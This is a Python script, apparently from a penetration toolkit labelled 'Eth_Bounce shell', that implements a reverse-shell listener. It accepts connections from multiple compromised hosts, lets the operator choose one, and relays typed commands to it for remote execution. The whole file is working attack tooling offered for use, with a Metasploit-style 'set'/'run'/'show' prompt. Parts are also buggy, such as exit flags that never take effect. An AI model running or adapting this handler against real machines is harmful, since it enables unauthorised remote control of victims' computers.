#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import threading 
import os
import re
from prettytable import PrettyTable

os.system('')

clientList = []             #连接的客户端列表
curClient = None            #当前的客户端
quitThread = False          #是否退出线程
lock = threading.Lock()

def shell_ctrl(socket,addr):
    while True:
        com = input(str(addr[0]) + ':~#')
        if com == '!ch':
            select_client()
            return
        if com == '!q':
            quitThread = True
            print('-----------------------* Connection has ended *--------------------------')
            exit(0)
        socket.send(com.encode('utf-8'))
        data = socket.recv(1024)
        print(data.decode('utf-8'))


def select_client():
    global clientList
    global curClient
    print('--------------* The current is connected to the client: *----------------')
    for i in range(len(clientList)):
        print('[%i]-> %s' % (i, str(clientList[i][1][0])))
    print('\033[33m[-] 请选择客户！\033[0m')

    while True:
        num = input('[=] input 客户编号：')
        if int(num) >= len(clientList):
            print('\033[33m[-] 请输入正确的数字！\033[0m')
            continue
        else:
            break

    curClient = clientList[int(num)]

    print('=' * 80)
    print(' ' * 20 + 'Client Shell from addr:', curClient[1][0])
    print('=' * 80)

def wait_connect(sk):
    global clientList
    while not quitThread:
        if len(clientList) == 0:
            print('\033[36m[O] 正在等待连接......\033[0m')
        sock, addr = sk.accept()
        print('\033[32m[+] New client %s is connection!\033[0m \n[=] input 客户编号：' % (addr[0]))
        lock.acquire()
        clientList.append((sock, addr))
        lock.release()

def mainll():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((data['ip'],int(data['port'])))
    s.listen(1024)

    t = threading.Thread(target=wait_connect,args=(s,))
    t.start()

    while True:
        if len(clientList) > 0:
            select_client() 
            shell_ctrl(curClient[0],curClient[1]) 

class mainl():
     def jan(d):
      if d == 'exit' or d == 'quit':
          cf = 1
      elif re.findall('set (.*) (.*)',d):
             dd = re.findall('set (.*) (.*)',d)
             data[dd[0][0]] = dd[0][1]
             print(f'{dd[0][0]} => {dd[0][1]}')  
      elif re.findall('set (.*)=(.*)',d):
              dd = re.findall('set (.*)=(.*)',d)       
              data[dd[0][0]] = dd[0][1]
              print(f'{dd[0][0]} => {dd[0][1]}') 
      elif d == "run" :
              #for i in range(int(data['NOT'])):
                
                  mainll()
               
      elif d == "show": 
              if data['pattern'] == '0':
                 tb = PrettyTable()
                 tb.add_column('必需的',['模式','ip','port'])
                 tb.add_column('name',['pattern','ip','port'])
                 tb.add_column('vlue',[data['pattern'],data['ip'],data['port']])
                 print(tb)
                 
              elif data['pattern'] == '1':
                 tb = PrettyTable()
                 tb.add_column('必需的',['模式','ip','port'])
                 tb.add_column('name',['pattern','ip','port'])
                 tb.add_column('vlue',[data['pattern'],data['ip'],data['port']])
                 print(tb)
      else:
           print('\033[31m[X] E:?? input ??\033[0m')           
     def scanf():
      cf = 0
      global data
      data = {'pattern':'0','ip':'0.0.0.0','port':9999}
      while cf == 0:
       d = input('RPG Eth_Penetration(\033[31mEth_Bounce shell\033[0m)>')
       
       if d :
        print(d)
        mainl.jan(d)
       else:
        print('\033[31m[X] E:input ??\033[0m')

def main():
    mainl.scanf()
if __name__ == '__main__':
    mainl.scanf()
